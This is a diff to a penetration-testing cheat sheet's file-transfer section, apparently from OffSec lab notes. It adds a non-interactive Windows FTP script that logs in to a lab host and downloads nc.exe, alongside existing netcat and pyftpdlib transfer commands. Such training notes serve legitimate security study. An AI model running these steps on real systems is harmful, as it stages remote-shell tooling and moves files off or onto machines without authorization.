@@ -4,7 +4,7 @@
 
 ### File transfer
 
-Sending a file through netcat
+#### Sending a file through netcat
 
 ```bash
 # Receiver
@@ -14,10 +14,25 @@ nc -l -p 1234 > out.file
 nc -w 3 [destination] 1234 < out.file
 ```
 
-ftp
+#### ftp
 
 <pre><code>sudo pip3 install pyftpdlib
 <strong>sudo python3 -m pyftpdlib -w -p 21</strong></code></pre>
+
+non-interactive on windows
+
+```
+echo open 10.11.0.4 21> ftp.txt
+echo USER offsec>> ftp.txt
+echo lab>> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+```
+
+```
+ftp -v -n -s:ftp.txt
+```
 
 windows
 
